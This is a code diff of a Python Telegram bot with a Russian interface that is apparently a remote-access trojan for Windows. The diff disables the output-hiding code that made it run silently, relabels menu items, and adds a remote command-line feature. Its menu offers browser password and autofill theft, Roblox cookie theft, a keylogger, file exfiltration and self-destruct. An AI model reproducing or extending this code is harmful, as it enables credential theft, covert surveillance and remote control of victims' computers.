@@ -29,14 +29,14 @@ import winreg
 from aiogram import types
 from aiogram.filters import Command
 
-## Отключение вывода на экран
-sys.stdout = open(os.devnull, 'w')  
-sys.stderr = open(os.devnull, 'w')  
-logging.basicConfig(level=logging.CRITICAL + 1)
-logging.getLogger('aiogram').disabled = True
+# ## Отключение вывода на экран
+# sys.stdout = open(os.devnull, 'w')  
+# sys.stderr = open(os.devnull, 'w')  
+# logging.basicConfig(level=logging.CRITICAL + 1)
+# logging.getLogger('aiogram').disabled = True
 
 # ## Включаем логирование, чтобы не пропустить важные сообщения
-logging.basicConfig(level=logging.INFO)
+# logging.basicConfig(level=logging.INFO)
 
 
 # Объект бота
@@ -147,6 +147,7 @@ async def cmd_start(message: types.Message):
     "/terminate_process — Завершить процесс\n\n"
 
     " Файлы и директории:\n"
+    "/cmd — открыть командную строку\n"
     "/send_file — Получить файл\n"
     "/upload_file — Загрузить файл\n"
     "/delete_file — Удалить файл\n"
@@ -192,8 +193,8 @@ async def cmd_start(message: types.Message):
             types.KeyboardButton(text="Удалить папку")
         ],
         [
-            types.KeyboardButton(text="Содержание директории"),
-            types.KeyboardButton(text="Переместиться по директории")
+            #types.KeyboardButton(text="Содержание директории"), working bad (maybe fixed later)
+            types.KeyboardButton(text="Переместиться по директории [ Просмотр папок ]")
         ],
         [
             types.KeyboardButton(text="Данные ПК"),
@@ -220,11 +221,12 @@ async def cmd_start(message: types.Message):
             types.KeyboardButton(text="История оперы")
         ],
         [
-            types.KeyboardButton(text="Автозаполнения браузера"), # NEW
-            types.KeyboardButton(text="Пароли браузера") # NEW
+            types.KeyboardButton(text="Автозаполнения браузера [new]"), # NEW
+            types.KeyboardButton(text="Пароли браузера [new]")          # NEW
         ],
         [
-            types.KeyboardButton(text="Роблокс куки") # NEW
+            types.KeyboardButton(text="Роблокс куки [new]"),            # NEW
+            types.KeyboardButton(text="Командная строка [new]")         # NEW
         ],
         [
             types.KeyboardButton(text="ALT + F4"),
@@ -255,11 +257,11 @@ async def cmd_start(message: types.Message):
             types.KeyboardButton(text="Поменять обои")
         ],
         [
-            types.KeyboardButton(text="key logger"), # NEW 
-            types.KeyboardButton(text="key logs") # NEW
+            types.KeyboardButton(text="key logger [new]"), # NEW 
+            types.KeyboardButton(text="key logs [new]") # NEW
         ],
         [
-            types.KeyboardButton(text="воспроизвести звук"),# NEW 
+            types.KeyboardButton(text="воспроизвести звук [new]"),# NEW 
             types.KeyboardButton(text="Самоуничтожение")
         ],
     ]
@@ -271,6 +273,12 @@ async def cmd_start(message: types.Message):
     await message.answer("Готов к использованию", reply_markup=keyboard)
 user_directories = {}
 
+
+############################  CMD COMMAND  ##############################
+
+from lib.System.PC.cmd import register_cmd_comand
+
+register_cmd_comand(dp)
 
 ###########################  ROBLOX COOKIE  #############################
 
